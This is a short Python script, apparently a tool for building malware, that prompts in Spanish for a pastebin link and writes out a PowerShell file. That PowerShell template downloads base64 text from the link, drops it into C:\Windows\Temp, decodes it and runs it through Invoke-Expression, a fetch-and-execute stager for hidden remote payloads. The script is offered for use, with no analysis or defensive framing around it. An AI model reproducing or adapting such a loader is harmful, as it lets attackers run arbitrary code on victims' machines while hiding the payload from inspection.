onedata = str('&wc = new-object System.Net.WebClient\n\n$wc.DownloadString("http://pastebin.com/raw/MLpLWsgW") | out-file c:\Windows\\temp\henneko.txt\n\n$File = Get-Content -Path "C:\Windows\Temp\henneko.txt"\n\nWrite-Host $File\n\n$enc = [System.Text.Encoding]::UTF8\n$string = $enc.GetString([System.Convert]::FromBase64String($File))\n\nWrite-Host $string\n\nInvoke-Expression -Command "$string"')
link = str(input("Link a usar de pastebin en base 64: "))

print (onedata.replace("http://pastebin.com/raw/MLpLWsgW", link))

import sys
sys.stdout=open("hennekogetdepastepython.ps1","w")
print (onedata.replace("http://pastebin.com/raw/MLpLWsgW", link))
sys.stdout.close()

f= open("hennekogetdepastepython.ps1","w+")
f.write(onedata.replace("http://pastebin.com/raw/MLpLWsgW", link))
f.close()